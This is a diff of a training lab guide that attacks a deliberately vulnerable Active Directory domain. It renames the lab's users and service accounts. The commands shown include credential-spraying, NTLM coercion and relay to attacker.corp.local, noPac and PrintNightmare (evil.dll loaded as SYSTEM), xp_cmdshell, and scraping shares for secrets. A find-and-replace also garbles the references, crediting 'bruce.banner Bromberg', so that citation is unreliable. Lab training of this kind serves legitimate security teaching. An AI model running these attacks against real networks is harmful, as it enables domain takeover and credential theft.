@@ -93,8 +93,8 @@ While Responder runs, monitor `/usr/share/responder/logs/Responder-Session.log` 
 
 ```
 [SMB] NTLMv2-SSP Client   : 10.10.0.100
-[SMB] NTLMv2-SSP Username : CORP\bob
-[SMB] NTLMv2-SSP Hash     : bob::CORP:1122334455667788:1A...:0101...
+[SMB] NTLMv2-SSP Username : CORP\tony.stark
+[SMB] NTLMv2-SSP Hash     : tony.stark::CORP:1122334455667788:1A...:0101...
 ```
 
 Save the full hash line to `hash.txt`. Crack:
@@ -313,10 +313,10 @@ Any authenticated user can read SYSVOL → decrypt → plaintext.
 ### Walkthrough
 
 ```bash
-impacket-Get-GPPPassword 'corp.local/alice:DVADlab2024!@10.10.0.10'
+impacket-Get-GPPPassword 'corp.local/peter.parker:DVADlab2024!@10.10.0.10'
 
 # Equivalent manual approach
-smbclient -U alice%'DVADlab2024!' //dc01.corp.local/SYSVOL \
+smbclient -U peter.parker%'DVADlab2024!' //dc01.corp.local/SYSVOL \
     -c 'prompt OFF; recurse ON; mget *'
 
 cd corp.local
@@ -377,10 +377,10 @@ sudo ntlmrelayx.py \
 python3 PetitPotam.py -d '' -u '' -p '' attacker.corp.local 10.10.0.10
 
 # If anonymous coercion blocked (CVE-2021-36942 patched), fall back to authenticated:
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' attacker.corp.local 10.10.0.10
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker.corp.local 10.10.0.10
 
 # Or DFSCoerce / SpoolSample / ShadowCoerce
-python3 dfscoerce.py -u alice -p 'DVADlab2024!' -d corp.local attacker.corp.local 10.10.0.10
+python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local attacker.corp.local 10.10.0.10
 ```
 
 ntlmrelayx writes the issued cert as base64 to its log:
@@ -456,7 +456,7 @@ SQL> EXEC xp_cmdshell 'whoami /all'
 SQL> EXEC xp_dirtree '\\10.10.0.1\share'   # coerces NTLM from SQL service account
 ```
 
-`xp_cmdshell` runs as the MSSQL service account, often `NT SERVICE\MSSQLSERVER` or a domain `svc_sql`. `xp_dirtree` triggers the SQL service to auth to the attacker's SMB → Responder capture → crack.
+`xp_cmdshell` runs as the MSSQL service account, often `NT SERVICE\MSSQLSERVER` or a domain `svc_jarvis`. `xp_dirtree` triggers the SQL service to auth to the attacker's SMB → Responder capture → crack.
 
 ### What you get
 
@@ -572,14 +572,14 @@ Net effect: low-priv user → TGT impersonating Administrator.
 ### Walkthrough
 
 ```bash
-impacket-noPac corp.local/alice:'DVADlab2024!' \
+impacket-noPac corp.local/peter.parker:'DVADlab2024!' \
                -dc-ip 10.10.0.10 \
                -dc-host dc01.corp.local \
                -impersonate Administrator \
                -shell
 
 # Or get just the ticket:
-impacket-noPac corp.local/alice:'DVADlab2024!' \
+impacket-noPac corp.local/peter.parker:'DVADlab2024!' \
                -dc-ip 10.10.0.10 \
                -dc-host dc01.corp.local \
                -impersonate Administrator \
@@ -622,7 +622,7 @@ sudo smbserver.py -smb2support share /tmp/share &
 cp evil.dll /tmp/share/
 
 # Trigger PrintNightmare
-python3 CVE-2021-1675.py corp.local/alice:'DVADlab2024!'@10.10.0.10 \
+python3 CVE-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 \
                          '\\10.10.0.1\share\evil.dll'
 
 # evil.dll runs as SYSTEM on DC. You're done.
@@ -684,7 +684,7 @@ Realistic engagements: 1 password per user, wait 60 min, repeat.
 
 ### What you get
 
-`alice:DVADlab2024!` → confirmed valid.
+`peter.parker:DVADlab2024!` → confirmed valid.
 
 [Flag: IA-005 — spray to first credential]
 
@@ -725,13 +725,13 @@ By sending one AS-REQ per candidate name and parsing the error, you enumerate us
 # Generate candidate usernames
 cat > names.txt <<EOF
 administrator
-alice
-bob
-charlie
+peter.parker
+tony.stark
+bruce.banner
 sql
-svc_sql
+svc_jarvis
 svc_backup
-svc_web
+svc_vision
 EOF
 
 # Add jsmith-style derivations
@@ -750,9 +750,9 @@ kerbrute userenum --dc 10.10.0.10 -d corp.local names.txt -o existing-users.txt
 
 Output:
 ```
-2026/05/21 16:03:21 >  [+] VALID USERNAME: alice@corp.local
-2026/05/21 16:03:21 >  [+] VALID USERNAME: svc_sql@corp.local
-2026/05/21 16:03:21 >  [+] VALID USERNAME: bob@corp.local
+2026/05/21 16:03:21 >  [+] VALID USERNAME: peter.parker@corp.local
+2026/05/21 16:03:21 >  [+] VALID USERNAME: svc_jarvis@corp.local
+2026/05/21 16:03:21 >  [+] VALID USERNAME: tony.stark@corp.local
 ```
 
 ### What you get
@@ -779,7 +779,7 @@ Users with `userAccountControl & 4194304 != 0` skip Kerberos pre-auth. The KDC w
 
 ```bash
 # Discovery via LDAP if you have any cred:
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --asreproast asrep.hash
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --asreproast asrep.hash
 
 # WITHOUT creds — request all users in a list:
 impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt \
@@ -789,7 +789,7 @@ impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt \
 
 Hash format (mode 18200):
 ```
-$krb5asrep$23$alice@CORP.LOCAL:abc...:def...
+$krb5asrep$23$peter.parker@CORP.LOCAL:abc...:def...
 ```
 
 Crack:
@@ -819,17 +819,17 @@ Authenticated users can read most shares. Configuration files, scripts, password
 
 ```bash
 # Map every share you have read/write on
-nxc smb 10.10.0.0/21 -u alice -p 'DVADlab2024!' \
+nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' \
     --shares --filter-shares READ,WRITE
 
 # Recursive pull and search
 for host in file01 dc01 sql01 ws01; do
-  smbmap -u alice -p 'DVADlab2024!' -H $host -R --depth 4 -q 2>/dev/null \
+  smbmap -u peter.parker -p 'DVADlab2024!' -H $host -R --depth 4 -q 2>/dev/null \
     | grep -E '\.(config|xml|kdbx|ps1|bat|cmd|vbs|txt|ini|backup|bak)$'
 done
 
 # Grep for secrets
-manspider -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.0/21 \
+manspider -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.0/21 \
           --regex 'password|passwd|pwd|cred|secret' \
           --max-filesize 5M --depth 3
 ```
@@ -919,7 +919,7 @@ Drop a Windows shortcut whose icon path is a UNC referencing your attacker box. 
 
 ```bash
 # Mount the share
-smbclient -U alice%'DVADlab2024!' //file01/share$
+smbclient -U peter.parker%'DVADlab2024!' //file01/share$
 
 # Put the SCF
 > get @evil.scf
@@ -958,7 +958,7 @@ Wait. As soon as someone opens the folder, hash → Responder.
 ### ShadowCoerce — MS-FSRVP
 
 ```bash
-python3 shadowcoerce.py -d corp.local -u alice -p 'DVADlab2024!' \
+python3 shadowcoerce.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
     attacker.corp.local 10.10.0.10
 ```
 
@@ -967,7 +967,7 @@ Triggers `\PIPE\Fssagentrpc`. Patched (KB5015888); DVAD leaves it open.
 ### DFSCoerce — MS-DFSNM
 
 ```bash
-python3 dfscoerce.py -u alice -p 'DVADlab2024!' -d corp.local \
+python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local \
     attacker.corp.local 10.10.0.10
 ```
 
@@ -976,7 +976,7 @@ Calls `NetrDfsAddStdRoot` / `NetrDfsRemoveStdRoot`. Triggers SMB auth from DC. N
 ### SpoolSample — MS-RPRN
 
 ```bash
-python3 SpoolSample.py corp.local/alice:'DVADlab2024!' \
+python3 SpoolSample.py corp.local/peter.parker:'DVADlab2024!' \
     target=10.10.0.10 listener=attacker.corp.local
 ```
 
@@ -1002,7 +1002,7 @@ curl http://wsus.corp.local:8530/ClientWebService/Client.asmx
 # SCCM client policy is signed; less easy. But:
 # - CM site-server NAA (Network Access Account) creds are stored in WMI
 # - Tools: SharpSCCM, sccmhunter
-sccmhunter find -u alice -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
+sccmhunter find -u peter.parker -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
 ```
 
 [Flag: IA-028]
@@ -1053,8 +1053,8 @@ Step | Action                                            | Output
   2  | dig SRV → forest topology                         | trust diagram
   3  | ldapsearch anon → user list (IA-001)              | users.txt
   4  | kerbrute userenum                                 | confirmed users
-  5  | kerbrute passwordspray DVADlab2024!               | alice valid
-  6  | impacket-GetUserSPNs -request                     | svc_sql kerb hash
+  5  | kerbrute passwordspray DVADlab2024!               | peter.parker valid
+  6  | impacket-GetUserSPNs -request                     | svc_jarvis kerb hash
   7  | hashcat -m 13100                                  | SqlServer123!
   8  | nxc mssql sa:SqlServer123!  xp_cmdshell           | SYSTEM on sql01
   9  | mimikatz / lsassy → svc_backup hash               | Backup Operators NT
@@ -1096,7 +1096,7 @@ A real engagement rarely follows a straight line — you'll fork at each step. B
 ```bash
 sudo responder -I dvad-ctf -wrfv -v
 # Trigger from a victim:
-# *Evil-WinRM* PS> net use \\NONEXIST\share /user:alice DVADlab2024!
+# *Evil-WinRM* PS> net use \\NONEXIST\share /user:peter.parker DVADlab2024!
 # OR rely on the DVAD scheduled task that lookups a bogus name.
 ```
 
@@ -1112,13 +1112,13 @@ wc -l users.txt
 
 ### Exercise 9.C — Coerce + ESC8 end-to-end
 
-Even if you already have alice's creds, run this without them. Then with anonymous PetitPotam blocked, run with auth.
+Even if you already have peter.parker's creds, run this without them. Then with anonymous PetitPotam blocked, run with auth.
 
 ```bash
 sudo ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
 python3 PetitPotam.py -d '' -u '' -p '' attacker.corp.local 10.10.0.10
 # If blocked:
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' attacker.corp.local 10.10.0.10
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' attacker.corp.local 10.10.0.10
 ```
 
 Then PKINIT and DCSync:
@@ -1201,7 +1201,7 @@ Produce `~/dvad/loot/01-ia/IA-report.md` listing every credential captured, the 
 
 ## References
 
-- **Charlie Bromberg — *The Hacker Recipes — Initial Access*** — practical onramp catalog.
+- **bruce.banner Bromberg — *The Hacker Recipes — Initial Access*** — practical onramp catalog.
 - **SpecterOps blog — *Coerce Me If You Can*** — coercion deep dives.
 - **MS-RPRN / MS-EFSR / MS-DFSNM / MS-FSRVP** — Microsoft protocol specs for the coercion vectors.
 - **Secura — *ZeroLogon whitepaper*** — CVE-2020-1472 cryptanalysis.
